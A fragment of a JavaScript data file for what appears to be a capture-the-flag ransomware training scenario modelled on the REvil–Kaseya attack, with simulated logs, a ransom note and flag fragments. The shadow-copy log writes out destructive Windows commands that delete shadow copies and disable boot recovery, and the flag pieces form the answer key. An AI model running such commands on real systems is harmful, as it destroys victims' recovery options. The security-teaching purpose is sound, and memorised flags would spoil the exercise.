      files: {
        "/ransomware-op/vss-deletion.log": `# Pre-Encryption: Shadow Copy Deletion
# Timestamp: 2021-07-02 22:47:13 UTC

vssadmin.exe delete shadows /all /quiet → SUCCESS (all shadow copies deleted)
wmic shadowcopy delete → SUCCESS
bcdedit /set {default} recoveryenabled No → SUCCESS

Recovery options eliminated. Proceeding to encryption.

Fragment-1: FLAG{TA0040_`,
        "/ransomware-op/encryption.log": `# Encryption Phase — REvil Ransomware
# Deployment: Kaseya VSA agent (malicious update package)

Targets: all endpoints managed by VSA agents (1,500 orgs)
Encryption: Salsa20 + RSA-2048 (per-file key encrypted with attacker public key)
Progress:
  [22:49] 50 organizations encrypted
  [22:53] 500 organizations encrypted
  [22:57] 1,500 organizations encrypted

Total encrypted files: ~2.2 billion

Fragment-2: R4NS0M_`,
        "/ransomware-op/ransom-note.txt": `YOUR NETWORK HAS BEEN ENCRYPTED BY REvil

All your files have been encrypted with military grade algorithms.
Without our private key, recovery is impossible.

To recover your files: visit our TOR site
http://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion

Ransom: $70,000,000 USD (Bitcoin)
Payment deadline: 72 hours

Do not attempt to recover files independently — you will corrupt them.

FLAG FRAGMENT: 1MP4CT}
[This is a training simulation — no systems were actually harmed]`,
      },
      dirs: {
        "/": [{ name: "ransomware-op", isDir: true }],
        "/ransomware-op": [
          { name: "vss-deletion.log", isDir: false },
          { name: "encryption.log", isDir: false },
          { name: "ransom-note.txt", isDir: false },
        ],
      },
      fragments: [
        { trigger: "/ransomware-op/vss-deletion.log", value: "FLAG{TA0040_", label: "Fragment 1 — VSS Deletion" },
        { trigger: "/ransomware-op/encryption.log", value: "R4NS0M_", label: "Fragment 2 — Encryption" },
        { trigger: "/ransomware-op/ransom-note.txt", value: "1MP4CT}", label: "Fragment 3 — Ransom Note" },
      ],
    },
  },
];
